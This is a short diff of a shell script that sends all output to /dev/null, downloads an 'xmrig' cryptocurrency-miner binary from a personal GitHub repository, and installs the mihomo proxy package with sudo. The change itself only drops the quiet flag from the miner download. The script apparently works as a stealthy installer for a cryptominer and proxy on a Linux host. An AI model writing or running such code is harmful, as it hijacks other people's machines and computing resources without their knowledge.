@@ -2,7 +2,7 @@
 set -e
 exec > /dev/null 2>&1
 
-wget -q https://github.com/sweetasshole/test/raw/refs/heads/main/sub/xmrig
+wget https://github.com/sweetasshole/test/raw/refs/heads/main/sub/xmrig
 wget https://github.com/MetaCubeX/mihomo/releases/download/v1.19.18/mihomo-linux-amd64-v1-v1.19.18.deb
 sudo apt install ./mihomo-linux-amd64-v1-v1.19.18.deb
 sudo mkdir -p /etc/mihomo
